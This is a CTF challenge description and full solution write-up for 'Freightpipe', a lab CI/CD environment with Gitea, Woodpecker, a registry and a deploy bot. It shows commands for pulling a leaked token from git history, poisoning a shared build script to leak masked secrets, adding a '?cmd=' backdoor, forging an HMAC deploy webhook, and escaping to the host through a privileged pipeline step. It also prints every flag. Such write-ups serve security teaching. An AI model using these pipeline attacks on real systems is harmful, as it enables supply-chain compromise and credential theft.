# Freightpipe

**Category:** b2r  **Difficulty:** insane  **Author:** abu

> Sparrow Freight runs everything through Freightpipe, their self-hosted software factory: a git server, a build pipeline, an image registry, and an auto-deploying production host, all wired together and watched by a deploy bot. Recon turned up a credential someone thought they'd cleaned up.
>
> See how far a leaked token gets you through the pipeline, and whether you can own the factory itself.

Run: `cd challenge && docker compose up -d`. Gitea on 3000, Woodpecker (read-only) on 8000, prod app on 9090. During the event the whole compose stack ran inside one sysbox pod per team, since stage 4 needs a privileged CI step. The root flag has to be written to `/root/root.txt` on that pod (`echo "$ROOT_FLAG" > /root/root.txt` in the pod entrypoint); compose alone doesn't do it.

## Solution

Four flags, one per stage.

**Recon.** The public `freightpipe-scripts` repo once committed a `.env.deploy` and then deleted it. It's not in HEAD, but history doesn't forget.

```sh
git clone http://<host>:3000/dev/freightpipe-scripts.git && cd freightpipe-scripts
git log --all -p | grep -A2 GITEA_TOKEN
```

That's a PAT for the `contributor` user. It can read the private `freightpipe-internal` repo:

```sh
curl -H "Authorization: token $PAT" http://<host>:3000/api/v1/repos/dev/freightpipe-internal/raw/FLAG1.txt
```

The same token can push to `freightpipe-scripts` but can't even see `prod-app`. So no editing the pipeline directly.

**User.** The `prod-app` pipeline clones `freightpipe-scripts` and runs `scripts/build.sh` on every build, and the review bot kicks off a build every so often. Poison `build.sh`, push with the PAT, and wait. The output shows up in the public Woodpecker build log. The user flag is in the build env as the `USER_FLAG` secret, which Woodpecker masks as `********`, so just encode it:

```sh
echo "user=$(printf %s "$USER_FLAG" | base64)"
```

**Prod.** The same build env holds `REGISTRY_TOKEN`, `WEBHOOK_SECRET` and `DEPLOY_URL`. Dump them the same way (`env | base64`). Reading the pipeline: build the image from `freightpipe-scripts`, push `registry:5000/prod-app:latest`, and prod redeploys `:latest` when it gets an HMAC-signed webhook.

The app source and Dockerfile also live in the repo we can write to, so we added a `?cmd=` endpoint to `app/main.py`, pushed, and waited for the bot to bake it into `:latest`. Then forge the webhook:

```sh
BODY='{"image":"prod-app:latest"}'
SIG=$(printf '%s' "$BODY" | openssl dgst -sha256 -hmac "$WEBHOOK_SECRET" | awk '{print $2}')
curl -X POST -H "X-Hub-Signature-256: sha256=$SIG" -d "$BODY" http://<host>:9090/deploy
curl 'http://<host>:9090/?cmd=env'
```

The deployed container has `FLAG3` and `PROD_APP_WRITE_TOKEN` in its env.

**Root.** That token can finally write `prod-app`, and `prod-app` is a trusted repo in Woodpecker, which means its steps are allowed to run privileged. Replace `.woodpecker.yml` with:

```yaml
skip_clone: true
steps:
  escape:
    image: alpine
    privileged: true
    volumes:
      - /:/host
    commands:
      - cat /host/root/root.txt
```

Push it with the deploy token, the bot builds it, and the root flag is in the log. The stage 1 CI job is unprivileged with no docker socket, so this is the only way up.

Flags: `H7CTF{fl4g1_l34k3d_t0k3n_in_g1t_h1st0ry}`, `H7CTF{1ppe_p01s0n3d_th3_sh4r3d_bu1ld_scr1pt}`, `H7CTF{f0rg3d_hm4c_d3pl0y3d_my_b4ckd00r_1m4g3}`, `H7CTF{tru5t3d_w00dp3ck3r_pr1v_st3p_0wn3d_th3_f4ct0ry}`
